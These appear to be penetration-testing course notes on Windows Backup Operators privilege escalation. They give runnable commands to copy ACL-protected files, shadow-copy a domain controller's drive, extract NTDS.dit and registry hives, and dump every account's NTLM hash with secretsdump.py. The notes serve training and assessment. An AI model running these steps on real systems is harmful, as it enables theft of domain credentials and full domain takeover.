# Windows Built-in Groups — Backup Operators PrivEsc

## Overview
Windows servers/DCs ship with built-in groups (or gain them via AD DS role installation) that confer special privileges. Present on Server 2008 R2+ (Hyper-V Administrators from Server 2012+):

- **Backup Operators**
- **Event Log Readers**
- **DnsAdmins**
- **Hyper-V Administrators**
- **Print Operators**
- **Server Operators**

> Accounts get added to these groups to enforce least privilege (avoiding unnecessary Domain/Enterprise Admin grants) — but membership can be accidental/leftover from testing. **Always audit and document group membership** as part of an assessment.

Check your own memberships:
```cmd
whoami /groups
```

---

## Backup Operators Group

### Privileges Granted
- **`SeBackupPrivilege`** — traverse any folder, list contents, and copy files **regardless of ACL** (no ACE needed for your account) — *if* accessed programmatically with the `FILE_FLAG_BACKUP_SEMANTICS` flag (standard `copy` won't work).
- **`SeRestorePrivilege`** — companion right for restoring backed-up data.
- Also permits **local logon to a Domain Controller**.

---

## Exploitation — Copying Protected Files

### Step 1 — Import PoC libraries
```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

### Step 2 — Check if SeBackupPrivilege is enabled
```powershell
whoami /priv
# or
Get-SeBackupPrivilege
```
> Note: may need an **elevated CMD/PowerShell** (UAC bypass) to actually hold this privilege depending on server config.

### Step 3 — Enable if disabled
```powershell
Set-SeBackupPrivilege
Get-SeBackupPrivilege
# SeBackupPrivilege is enabled
```

### Step 4 — Copy a protected file
```powershell
cat 'C:\Confidential\2021 Contract.txt'
# Access denied
```
```powershell
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
cat .\Contract.txt
```
→ File content successfully accessed despite lacking normal read permissions.

---

## Attacking a Domain Controller — Extracting NTDS.dit

`NTDS.dit` = the AD database, containing **NTLM hashes for every user/computer object in the domain**. It's normally **locked** and inaccessible to unprivileged users — but Backup Operators can work around this.

### Step 1 — Create a shadow copy of the C: drive (exposes it unlocked)
```powershell
diskshadow.exe
```
```
DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit
```
- The shadow copy (mounted as `E:`) contains an **unlocked** copy of `NTDS.dit`.

### Step 2 — Copy NTDS.dit using SeBackupPrivilege
```powershell
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

### Step 3 — Back up SAM & SYSTEM registry hives
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
> ⚠️ An **explicit deny ACE** for your user/group will still block access, even with `FILE_FLAG_BACKUP_SEMANTICS` set.

---

## Extracting Credentials from NTDS.dit

### Option A — DSInternals (PowerShell)
```powershell
Import-Module .\DSInternals.psd1
$key = Get-BootKey -SystemHivePath .\SYSTEM
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```
- Returns full account details including **NTHash**, Kerberos keys, account flags, etc. for a specific object.

### Option B — Impacket secretsdump.py (offline, dumps all accounts)
```bash
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
krbtgt:502:...
htb-student:1103:...
svc_backup:1104:...
```
- Dumps NTLM hashes for **every domain account** in one pass.
- Usable for **pass-the-hash** or offline cracking with **Hashcat**.
- Cracked results can also be presented to the client as password-strength statistics/recommendations (min length policy, dictionary blocklists, etc.).

---

## Alternative: Robocopy (No External Tools Needed)

`robocopy` also respects backup semantics and can be used to copy `NTDS.dit` without any additional PoC scripts/DLLs:

```cmd
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```
- `/B` = backup mode — bypasses file locks/ACLs the same way `Copy-FileSeBackupPrivilege` does.
- Fully built-in to Windows — useful when tool upload isn't possible.

---

## Key Takeaway
**Backup Operators** membership is a direct path to full domain compromise on a DC: `SeBackupPrivilege` bypasses ACLs for file reads → shadow-copy the C: drive to unlock `NTDS.dit` → extract it via `Copy-FileSeBackupPrivilege` or built-in `robocopy /B` → dump hashes offline with DSInternals or `secretsdump.py`. No external tooling is strictly required if `robocopy` is available.